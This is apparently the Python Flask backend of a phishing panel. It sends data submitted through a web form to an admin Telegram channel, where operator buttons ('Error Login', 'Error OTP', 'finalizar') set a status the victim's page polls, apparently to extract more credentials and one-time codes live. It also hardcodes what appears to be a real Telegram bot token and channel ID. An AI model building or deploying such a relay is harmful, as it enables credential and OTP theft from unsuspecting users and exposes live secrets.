import os
import logging
import json
import traceback
from flask import Flask, request, jsonify
from flask_cors import CORS
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

logging.basicConfig(level=logging.INFO)

TOKEN = os.environ.get("BOT_TOKEN", "8371195355:AAFa7xJjZJeO9JxlbgEE0eHXB3vPa8fHMo0")
CANAL_ADMIN_ID = int(os.environ.get("CANAL_ADMIN_ID", "-1003904819480"))
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://backend-oa88.onrender.com").rstrip('/')

ARCH_ESTADOS = "estados_usuarios.json"

app = Flask(__name__, static_folder='.', static_url_path='')
CORS(app)

bot = telebot.TeleBot(TOKEN)

# --- SISTEMA DE LECTURA/ESCRITURA DE ESTADOS ---
def leer_estados():
    if not os.path.exists(ARCH_ESTADOS):
        return {}
    try:
        with open(ARCH_ESTADOS, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}

def guardar_estado(user_id, status):
    estados = leer_estados()
    estados[str(user_id).strip()] = str(status).strip()
    try:
        with open(ARCH_ESTADOS, "w", encoding="utf-8") as f:
            json.dump(estados, f)
        print(f"💾 ESTADO GUARDADO: {user_id} -> {status}")
    except Exception as e:
        print(f"❌ Error guardando estado: {e}")

def obtener_estado(user_id):
    estados = leer_estados()
    return estados.get(str(user_id).strip(), "normal")


def crear_teclado_admin(user_id):
    markup = InlineKeyboardMarkup(row_width=2)
    btn_opt1 = InlineKeyboardButton("❌ Error Login", callback_data=f"admin:A:{user_id}")
    btn_opt2 = InlineKeyboardButton("❌ Error Login", callback_data=f"admin:B:{user_id}")
    btn_opt3 = InlineKeyboardButton("❌ Error Login", callback_data=f"admin:C:{user_id}")
    btn_opt4 = InlineKeyboardButton("❌ Error Login", callback_data=f"admin:D:{user_id}")
    btn_opt5 = InlineKeyboardButton("❌ Error Login", callback_data=f"admin:E:{user_id}")
    btn_opt6 = InlineKeyboardButton("❌ Error Login", callback_data=f"admin:F:{user_id}")
    btn_opt7 = InlineKeyboardButton("❌ Error Login", callback_data=f"admin:G:{user_id}")
    btn_opt8 = InlineKeyboardButton("❌ Error Login", callback_data=f"admin:H:{user_id}")
    btn_opt9 = InlineKeyboardButton("❌ Error OTP", callback_data=f"admin:I:{user_id}")
    btn_opt10 = InlineKeyboardButton("finalizar", callback_data=f"admin:J:{user_id}")
    markup.add(btn_opt1, btn_opt2, btn_opt3, btn_opt4, btn_opt5, btn_opt6, btn_opt7, btn_opt8, btn_opt9, btn_opt10)
    return markup


@app.route('/', methods=['GET'])
def home():
    return app.send_static_file('index.html')


# --- RECEPCIÓN DE CLICS DESDE TELEGRAM ---
@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return "OK", 200
    return "Forbidden", 403


@app.route('/api/formulario', methods=['POST'])
def recibir_web():
    datos = request.json or {}
    user_id = str(datos.get('user_id', '')).strip()

    if not user_id:
        return jsonify({"error": "Falta 'user_id'"}), 400

    guardar_estado(user_id, "normal")

    nombre = datos.get('nombre', 'Usuario Web')
    mensaje = datos.get('mensaje', 'Sin mensaje')

    texto_canal = (
        f"🟡 <b>NUEVA INFORMACIÓN RECIBIDA</b>\n\n"
        f"👤 <b>Origen:</b> {nombre}\n"
        f"🆔 <b>ID Sesión:</b> <code>{user_id}</code>\n\n"
        f"{mensaje}"
    )

    try:
        bot.send_message(
            chat_id=CANAL_ADMIN_ID,
            text=texto_canal,
            parse_mode="HTML",
            reply_markup=crear_teclado_admin(user_id)
        )
        return jsonify({"status": "OK"}), 200
    except Exception as e:
        print(f"❌ Error enviando a Telegram: {e}")
        try:
            bot.send_message(
                chat_id=CANAL_ADMIN_ID,
                text=f"NUEVA INFORMACIÓN RECIBIDA\nID: {user_id}\n\n{mensaje}",
                reply_markup=crear_teclado_admin(user_id)
            )
            return jsonify({"status": "OK"}), 200
        except Exception as e2:
            print(f"❌ Error crítico de respaldo: {e2}")
            return jsonify({"error": str(e2)}), 500


@app.route('/get_status', methods=['GET'])
def get_status():
    user_id = str(request.args.get('user_id', '')).strip()
    status = obtener_estado(user_id)
    return jsonify({'user_id': user_id, 'status': status})


@app.route('/update_status', methods=['POST'])
def update_status():
    datos = request.json or {}
    user_id = str(datos.get('user_id', '')).strip()
    status = str(datos.get('status', 'normal')).strip()
    if user_id:
        guardar_estado(user_id, status)
        return jsonify({'status': 'OK', 'user_id': user_id, 'new_status': status})
    return jsonify({'error': 'Falta user_id'}), 400


@bot.callback_query_handler(func=lambda call: call.data.startswith('admin:'))
def procesar_respuesta_admin(call):
    print(f"📥 BOTÓN PRESIONADO: {call.data}")
    try:
        # 1. Quitar la animación de carga del botón en Telegram
        bot.answer_callback_query(call.id, text="Acción registrada")

        partes = call.data.split(':')
        opcion = partes[1].strip()
        target_user_id = partes[2].strip()
        admin_name = call.from_user.first_name or "Admin"

        # 2. GUARDAR EL ESTADO EN DISCO (CRÍTICO)
        guardar_estado(target_user_id, opcion)

        # 3. ELIMINAR LOS BOTONES Y EDITAR MENSAJE
        try:
            texto_original = call.message.text or ""
            texto_nuevo = (
                f"{texto_original}\n\n"
                f"------------------------------\n"
                f"🔵 ESTADO SOLICITADO: ({opcion})\n"
                f"✍️ Atendido por: {admin_name}"
            )
            # Se quitan los botones enviando reply_markup=None
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=texto_nuevo,
                reply_markup=None
            )
            print("✅ Botones removidos con éxito de Telegram")
        except Exception as e_edit:
            print(f"⚠️ Error al modificar el mensaje en Telegram (Revisa permisos del Bot): {e_edit}")

    except Exception as e:
        print("❌ Error procesando callback:")
        traceback.print_exc()


# Intentar activar webhook al arrancar
try:
    bot.remove_webhook()
    bot.set_webhook(url=f"{RENDER_URL}/webhook")
    print(f"🔗 Webhook configurado automáticamente en: {RENDER_URL}/webhook")
except Exception as e:
    print(f"⚠️ Error registrando Webhook automático: {e}")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
